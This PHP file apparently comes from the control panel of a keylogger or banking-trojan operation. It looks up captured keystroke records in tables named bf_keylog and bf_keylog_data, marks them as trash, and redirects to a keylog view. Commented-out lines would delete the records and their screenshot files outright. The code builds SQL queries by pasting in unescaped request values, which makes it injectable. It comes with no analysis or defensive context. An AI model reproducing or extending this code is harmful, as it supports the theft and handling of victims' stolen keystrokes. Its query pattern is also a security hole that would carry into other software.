<?php

if(!empty($Cur['id'])){	$item = $mysqli->query('SELECT b.*, a.id aid from bf_keylog a, bf_keylog_data b WHERE (b.id = \''.$Cur['id'].'\') AND (a.hash = b.hash) LIMIT 1');

	if($item->id == $Cur['id']){
		/*
		$files = $mysqli->query('SELECT screen FROM bf_keylog_data WHERE (prefix = \''.$item->prefix.'\') AND (uid = \''.$item->uid.'\') AND (hash = \''.$item->hash.'\')', null, null, false);

		if(count($files) > 0){
			foreach($files as $file){
				@unlink('logs/keylogs/' . $file->screen);
			}
		}
		*/
		//$mysqli->query('DELETE FROM bf_keylog_data WHERE (prefix = \''.$item->prefix.'\') AND (uid = \''.$item->uid.'\') AND (hash = \''.$item->hash.'\')');
		$mysqli->query('update bf_keylog_data set trash = \'1\' WHERE (prefix = \''.$item->prefix.'\') AND (uid = \''.$item->uid.'\') AND (hash = \''.$item->hash.'\')');

	    header('Location: /keylog/hash-'.$item->aid.'.html?ajax=1');
	    exit;
	}
}

exit;

?>